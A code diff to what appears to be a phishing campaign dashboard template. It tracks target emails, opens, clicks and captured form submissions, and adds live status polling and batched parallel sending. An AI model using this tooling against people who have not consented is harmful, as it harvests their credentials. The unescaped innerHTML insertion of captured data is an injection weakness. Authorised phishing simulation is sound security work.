@@ -401,7 +401,7 @@
     </style>
 </head>
 
-<body>
+<body data-campaign-id="{{ campaign.id }}">
     <!-- Top Nav -->
     <div class="topnav">
         <div class="nav-left">
@@ -459,9 +459,9 @@
                         <th>Captured Data</th>
                     </tr>
                 </thead>
-                <tbody>
+                <tbody id="target-body">
                     {% for target in campaign.targets %}
-                    <tr>
+                    <tr data-row-id="{{ target.id }}">
                         <td>
                             <div class="target-email">{{ target.email }}</div>
                             <div class="tracking-id">ID: {{ target.tracking_id[:8] }}...</div>
@@ -475,7 +475,7 @@
                                 {{ target.status|upper }}
                             </span>
                         </td>
-                        <td>
+                        <td id="open-{{ target.id }}">
                             {% set opens = target.events|selectattr('type', 'equalto', 'open')|list %}
                             {% if opens %}
                             <span class="badge badge-yes-warn">YES ×{{ opens|length }}</span>
@@ -483,7 +483,7 @@
                             <span class="badge badge-no">NO</span>
                             {% endif %}
                         </td>
-                        <td>
+                        <td id="click-{{ target.id }}">
                             {% set clicks = target.events|selectattr('type', 'equalto', 'click')|list %}
                             {% if clicks %}
                             <span class="badge badge-yes-warn">YES ×{{ clicks|length }}</span>
@@ -491,7 +491,7 @@
                             <span class="badge badge-no">NO</span>
                             {% endif %}
                         </td>
-                        <td>
+                        <td id="submit-{{ target.id }}">
                             {% set submits = target.events|selectattr('type', 'equalto', 'submit')|list %}
                             {% if submits %}
                             <span class="badge badge-yes-green">CAPTURED ✓</span>
@@ -499,7 +499,7 @@
                             <span class="badge badge-no">NO</span>
                             {% endif %}
                         </td>
-                        <td>
+                        <td id="data-{{ target.id }}">
                             {% if target.form_data %}
                             <details>
                                 <summary>[ VIEW DATA ]</summary>
@@ -517,7 +517,9 @@
     </div>
 
     <script>
-        // Clock
+        const CAMPAIGN_ID = parseInt(document.body.dataset.campaignId);
+
+        // ── Clock ────────────────────────────────────────────────
         function updateClock() {
             const n = new Date();
             const pad = v => String(v).padStart(2, '0');
@@ -526,23 +528,62 @@
         }
         setInterval(updateClock, 1000); updateClock();
 
-        // Check pending on load
+        // ── Live row patcher ─────────────────────────────────────
+        function badgeHtml(count, yesClass, yesLabel, noLabel) {
+            return count > 0
+                ? `<span class="badge ${yesClass}">${yesLabel} ×${count}</span>`
+                : `<span class="badge badge-no">${noLabel}</span>`;
+        }
+
+        async function pollStatus() {
+            try {
+                const res = await fetch(`/api/campaign/${CAMPAIGN_ID}/status`);
+                if (!res.ok) return;
+                const data = await res.json();
+                for (const t of data.targets) {
+                    // Status badge
+                    const statusEl = document.getElementById(`status-${t.id}`);
+                    if (statusEl) {
+                        const cls = t.status.toLowerCase() === 'sent' ? 'badge-sent'
+                            : t.status.toLowerCase() === 'pending' ? 'badge-pending'
+                                : 'badge-failed';
+                        statusEl.className = `badge ${cls}`;
+                        statusEl.textContent = t.status.toUpperCase();
+                        statusEl.dataset.status = t.status;
+                    }
+                    // Open
+                    const openEl = document.getElementById(`open-${t.id}`);
+                    if (openEl) openEl.innerHTML = badgeHtml(t.opens, 'badge-yes-warn', 'YES', 'NO');
+                    // Click
+                    const clickEl = document.getElementById(`click-${t.id}`);
+                    if (clickEl) clickEl.innerHTML = badgeHtml(t.clicks, 'badge-yes-warn', 'YES', 'NO');
+                    // Submit
+                    const submitEl = document.getElementById(`submit-${t.id}`);
+                    if (submitEl) submitEl.innerHTML = t.submits > 0
+                        ? `<span class="badge badge-yes-green">CAPTURED ✓</span>`
+                        : `<span class="badge badge-no">NO</span>`;
+                    // Captured data
+                    const dataEl = document.getElementById(`data-${t.id}`);
+                    if (dataEl && t.captured && dataEl.querySelector('.dash-placeholder')) {
+                        dataEl.innerHTML = `<details><summary>[ VIEW DATA ]</summary><pre>${JSON.stringify(t.captured, null, 2)}</pre></details>`;
+                    }
+                }
+            } catch (_) { }
+        }
+
+        // Start polling immediately and every 3 seconds
+        pollStatus();
+        setInterval(pollStatus, 3000);
+
+        // ── Sending logic ─────────────────────────────────────────
         document.addEventListener('DOMContentLoaded', function () {
             const pendingTargets = document.querySelectorAll('[data-status="Pending"]');
             if (pendingTargets.length > 0) {
                 document.getElementById('start-sending-btn').style.display = 'inline-flex';
-            } else {
-                startAutoReload();
             }
         });
 
         let isSending = false;
-
-        function startAutoReload() {
-            if (!isSending) {
-                setTimeout(function () { if (!isSending) location.reload(); }, 5000);
-            }
-        }
 
         async function startSending() {
             isSending = true;
@@ -557,37 +598,38 @@
             document.getElementById('progress-container').style.display = 'block';
             updateProgress(0, total);
 
-            for (const targetSpan of pendingTargets) {
-                const targetId = targetSpan.dataset.targetId;
-                targetSpan.className = 'badge badge-pending';
-                targetSpan.innerText = 'TX...';
+            // Send in parallel batches of 5 for speed
+            const BATCH = 5;
+            for (let i = 0; i < pendingTargets.length; i += BATCH) {
+                const batch = pendingTargets.slice(i, i + BATCH);
+                batch.forEach(el => { el.className = 'badge badge-pending'; el.innerText = 'TX...'; });
 
-                try {
-                    const response = await fetch(`/api/send_target/${targetId}`, { method: 'POST' });
-                    const result = await response.json();
-
-                    if (result.success) {
-                        targetSpan.className = 'badge badge-sent';
-                        targetSpan.innerText = 'SENT';
-                        targetSpan.dataset.status = 'Sent';
-                    } else {
-                        targetSpan.className = 'badge badge-failed';
-                        targetSpan.innerText = 'FAILED';
-                        targetSpan.dataset.status = 'Failed';
+                await Promise.all(batch.map(async (targetSpan) => {
+                    const targetId = targetSpan.dataset.targetId;
+                    try {
+                        const response = await fetch(`/api/send_target/${targetId}`, { method: 'POST' });
+                        const result = await response.json();
+                        if (result.success) {
+                            targetSpan.className = 'badge badge-sent';
+                            targetSpan.innerText = 'SENT';
+                            targetSpan.dataset.status = 'Sent';
+                        } else {
+                            targetSpan.className = 'badge badge-failed';
+                            targetSpan.innerText = 'FAILED';
+                            targetSpan.dataset.status = 'Failed';
+                        }
+                    } catch (_) {
+                        targetSpan.className = 'badge badge-error';
+                        targetSpan.innerText = 'ERROR';
+                        targetSpan.dataset.status = 'Error';
                     }
-                } catch (error) {
-                    targetSpan.className = 'badge badge-error';
-                    targetSpan.innerText = 'ERROR';
-                    targetSpan.dataset.status = 'Error';
-                }
-
-                completed++;
-                updateProgress(completed, total);
+                    completed++;
+                    updateProgress(completed, total);
+                }));
             }
 
             btn.innerHTML = '✓ DONE';
             isSending = false;
-            setTimeout(() => location.reload(), 2000);
         }
 
         function updateProgress(completed, total) {
